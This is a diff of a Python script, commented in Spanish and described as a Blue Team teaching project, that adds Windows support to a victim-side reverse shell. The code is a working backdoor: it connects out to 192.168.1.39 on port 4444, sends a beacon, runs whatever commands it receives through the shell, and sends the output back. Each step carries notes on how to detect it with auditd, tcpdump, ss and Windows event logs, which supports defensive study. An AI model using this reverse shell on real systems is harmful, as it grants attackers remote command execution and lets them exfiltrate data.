@@ -3,95 +3,130 @@
 # REVERSE SHELL - LADO DE LA VÍCTIMA
 # PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
 # ADVERTENCIA: Solo usar en laboratorio aislado propio
+# COMPATIBILIDAD: Windows + Linux
 # =============================================================================
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ IMPORTACIÓN DE LIBRERÍAS                                                │
 # └─────────────────────────────────────────────────────────────────────────┘
-import socket, subprocess
-    # socket     → Comunicaciones de red (conectar, enviar/recibir datos)
-    # subprocess → Ejecutar comandos del sistema (CRÍTICO - mayor IoC)
-    #
-    # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA en EDR/Sysmon
-    # 🛡️ MANJARO: sudo ausearch -c python3 | sudo journalctl -f
+import socket, subprocess, sys
+
+# socket     → Comunicaciones de red
+# subprocess → Ejecutar comandos del sistema
+# sys        → Detección de sistema operativo
+#
+# 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA
+# 🛡️ MANJARO: sudo ausearch -c python3
+# 🛡️ WINDOWS: Get-EventLog -LogName Application | Where-Object {$_.Message -like "*Python*"}
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
-# │ FUNCIÓN DE EJECUCIÓN DE COMANDOS                                        │
+# │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX             │
 # └─────────────────────────────────────────────────────────────────────────┘
+
 def ejecutarComando(command):
-    # check_output() → Ejecuta comando y captura la salida
-    # shell=True     → Ejecuta a través del shell (/bin/sh en Linux)
+    # check_output() → Ejecuta comando y captura salida
+    # shell=True     → Ejecuta a través del shell
+    # decode()       → Convierte bytes a string (Windows lo requiere)
     #
-    # 🛡️ DETECCIÓN: python → bash/sh (auditd/EDR) - EL MAYOR IoC
-    # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
-    return subprocess.check_output(command, shell=True)
+    # 🛡️ DETECCIÓN: python → cmd/bash - EL MAYOR IoC
+    # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
+    # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
+    
+    # Decodificar bytes a string (necesario en Windows)
+    command_str = command.decode('utf-8', errors='ignore')
+    
+    # Ejecutar comando
+    return subprocess.check_output(command_str, shell=True)
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CREACIÓN DEL SOCKET                                                     │
 # └─────────────────────────────────────────────────────────────────────────┘
+
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # socket.socket() → Crea un endpoint de comunicación de red
-    # AF_INET         → Familia de direcciones IPv4
-    # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)
-    #
-    # 🛡️ DETECCIÓN: La creación del socket no es visible en red
-    # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
+# socket.socket() → Crea endpoint de red
+# AF_INET         → IPv4
+# SOCK_STREAM     → TCP
+#
+# 🛡️ DETECCIÓN: sudo lsof -i -P -n | grep python (Linux)
+# 🛡️ DETECCIÓN: netstat -ano | findstr "python" (Windows)
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
-# │ CONEXIÓN SALIENTE AL ATACANTE - PUNTO DE DETECCIÓN #1 ⚠️                │
+# │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️                            │
 # └─────────────────────────────────────────────────────────────────────────┘
+
 connection.connect(("192.168.1.39", 4444))
-    # connect()       → Inicia conexión TCP al servidor del atacante
-    # 192.168.1.39    → IP del atacante (C2 server)
-    # 4444            → Puerto del atacante
-    #
-    # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444 (Firewall/IDS)
-    # 🛡️ COMANDO MANJARO: sudo ss -antp | grep 4444
+
+# connect()       → Conecta al atacante
+# 192.168.1.39    → IP del atacante
+# 4444            → Puerto del atacante
+#
+# 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444
+# 🛡️ MANJARO: sudo ss -antp | grep 4444
+# 🛡️ WINDOWS: netstat -ano | findstr "4444"
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
 # └─────────────────────────────────────────────────────────────────────────┘
-connection.send(" \n [+] Conexion Exitosamente Establecida \n".encode('utf-8'))
-    # send()          → Envía datos al atacante a través del túnel TCP
-    # encode('utf-8') → Convierte string a bytes (requerido en Python 3)
-    #
-    # 🛡️ DETECCIÓN #2: Firma de texto "Conexion Exitosamente" (DLP/IDS)
-    # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
+
+connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))
+
+# send()          → Envía beacon al atacante
+# encode('utf-8') → Convierte string a bytes
+#
+# 🛡️ DETECCIÓN #2: Firma "Conexion Exitosamente"
+# 🛡️ MANJARO: sudo tcpdump -i any port 4444 -X
+# 🛡️ WINDOWS: Wireshark tcp.port == 4444
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
 # └─────────────────────────────────────────────────────────────────────────┘
-while True: # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
+
+while True:
+    
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
     # └─────────────────────────────────────────────────────────────────────┘
+    
     command = connection.recv(1024)
-        # recv(1024) → Espera y recibe hasta 1024 bytes del atacante
-        #
-        # 🛡️ DETECCIÓN #3: Tráfico entrante en conexión establecida
-        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -n -v     
+    
+    # recv(1024) → Recibe comandos del atacante (bytes)
+    #
+    # 🛡️ DETECCIÓN #3: Tráfico entrante
+    # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -n -v
+    # 🛡️ WINDOWS: netstat -ano | findstr "ESTABLISHED"
+    
     # ┌─────────────────────────────────────────────────────────────────────┐
-    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ (EL MÁS CRÍTICO)    │
+    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️                     │
     # └─────────────────────────────────────────────────────────────────────┘
-    resultadosComando = ejecutarComando(command)
-        
-        # ejecutarComando() → Llama a la función que ejecuta el comando
-        # command           → Son BYTES desde recv(), subprocess lo acepta
-        #
-        # 🛡️ DETECCIÓN #4: python → bash/sh (auditd/EDR) - EL MAYOR IoC
-        # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
+    
+    try:
+        resultadosComando = ejecutarComando(command)
+    except Exception as e:
+        # Si hay error, enviar mensaje de error al atacante
+        resultadosComando = str(e).encode('utf-8')
+    
+    # ejecutarComando() → Ejecuta el comando
+    # command.decode()  → Convierte bytes a string (Windows)
+    #
+    # 🛡️ DETECCIÓN #4: python → cmd/bash (EL MAYOR IoC)
+    # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
+    # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
+    
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
     # └─────────────────────────────────────────────────────────────────────┘
+    
     connection.send(resultadosComando)
-        # send() → Envía resultados al atacante (exfiltración)
-        #
-        # 🛡️ DETECCIÓN #5: Datos salientes sensibles (DLP/Wireshark)
-        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
+    
+    # send() → Envía resultados (exfiltración)
+    #
+    # 🛡️ DETECCIÓN #5: Datos salientes sensibles
+    # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
+    # 🛡️ WINDOWS: Wireshark tcp.port == 4444
+
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️                                │
 # └─────────────────────────────────────────────────────────────────────────┘
-connection.close()
-    # close() → Cierra el socket y libera el puerto
-    #
-    # ⚠️ PROBLEMA: Está FUERA del while True, NUNCA se ejecuta
-    # ✅ SOLUCIÓN: Moverlo DENTRO del while con un try/except
-    #
-    # 🛡️ DETECCIÓN: Socket queda abierto hasta que el proceso muere
-    # 🛡️ COMANDO MANJARO: sudo netstat -antp | grep python
+
+# connection.close()  ← Fuera del while, nunca se ejecuta
